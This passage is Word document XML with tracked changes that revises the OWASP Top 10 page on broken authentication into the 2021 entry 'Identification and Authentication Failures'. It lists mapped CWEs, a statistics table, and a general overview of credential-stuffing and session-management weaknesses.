        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2469" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1815DA00" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2470" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1958DE6F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2471" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2472" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## List of Mapped CWEs </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="015A1727" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2473" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7836E9F0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2474" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2475" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-937: OWASP Top 10 2013: Using Components with Known </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Vulnerabilities](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/937.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6DB993EC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2476" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2477" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1035: 2017 Top 10 A9: Using Components with Known </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Vulnerabilities](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1035.html) </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="036CB428" w14:textId="77777777" w:rsidR="00E300D6" w:rsidRDefault="00841D1E" w:rsidP="00534EDD">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2478" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">- [CWE-1104: Use of Unmaintained Third Party </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Components](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">https://cwe.mitre.org/data/definitions/1104.html) </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidR="00E300D6">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4819E6"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751695AC"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"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E78D0E8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>title:   "A07:2021 – Identification and Authentication Failures"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF343FF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>id:      "A07:2021"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E84873F"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7D454E3B"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66D71F2C"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#A07:2021 – Identification and Authentication Failures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[icon](assets/TOP_10_Icons_Final_Identification_and_Authentication_Failures.png){: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name="Identification and Authentication Failures", lang=lang, source=source, parent=parent, predecessor=</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>extra.osib.document</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> ~ ".2017.2") }}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65D3D0FF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0A05A3B4" w14:textId="45807E75" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00E13797" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2479" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2480" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve"># A2:2017 </w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="1565D46F" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2481" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2482" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Factors</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7E9367F5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2483" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="780826B3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2484" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2485"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6BC1953D" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2486" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2487" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>|:-------------:|:--------------------:|:--------------------:|:--------------:|:--------------:|:----------------------:|:---------------------:|:-------------------:|:------------:|</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7C873ADE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2488" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2489" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>| 22          | 14.84%             | 2.55%              | 7.40                 | 6.50                | 79.51%       | 45.72%       | 132,195           | 3,897      |</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6AEA64A3" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2490" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D23A326" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2491" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2492" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Overview</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1B36ABDE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2493" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1B6C2CEE" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2494" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Previously known as *</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Broken Authentication</w:t>
      </w:r>
      <w:ins w:id="2495" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*, this category slid down</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6D8024AB" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2496" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2497" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Threat agents/Attack vectors | Security Weakness           | Impacts               |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="680BAFFA" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2498" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2499" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| -- | -- | -- |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="236AED67" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2500" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2501" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Access Lvl : Exploitability 3 | Prevalence 2 : Detectability 2 | Technical 3 : Business |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="58224B41" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2502" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2503" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>| Attackers have access to hundreds of millions of valid username and password combinations for credential stuffing, default administrative account lists, automated brute force, and dictionary attack tools. Session management attacks are well understood, particularly in relation to unexpired session tokens. | The prevalence of broken authentication is widespread due to the design and implementation of most identity and access controls. Session management is the bedrock of authentication and access controls, and is present in all stateful applications. Attackers can detect broken authentication using manual means and exploit them using automated tools with password lists and dictionary attacks. | Attackers have to gain access to only a few accounts, or just one admin account to compromise the system. Depending on the domain of the application, this may allow money laundering, social security fraud, and identity theft, or disclose legally protected highly sensitive information. |</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="36ADD75A" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2504" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="462B7043" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2505" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:del w:id="2506" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText>## Is the Application Vulnerable?</w:delText>
        </w:r>
      </w:del>
    </w:p>
    <w:p w14:paraId="0B7E88A5" w14:textId="77777777" w:rsidR="00E13797" w:rsidRPr="00E13797" w:rsidRDefault="00E13797" w:rsidP="0024421C">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:del w:id="2507" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="200472AA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2508" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2509" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">from the second position and now includes Common Weakness </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="65AFB32E" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2510" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2511" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Enumerations (CWEs) related to identification</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="2079DA3B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2512" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2513" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>failures. Notable CWEs included are *CWE-297: Improper Validation of</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7DB5E032" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2514" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2515" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Certificate with Host Mismatch*, *CWE-287: Improper Authentication*, and</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4566EB67" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2516" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2517" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>*CWE-384: Session Fixation*.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1861B765" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2518" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="77C56386" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2519" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="2520" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>## Description</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6A87F09B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2521" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7C265DEB" w14:textId="104CCE4D" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="2522" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
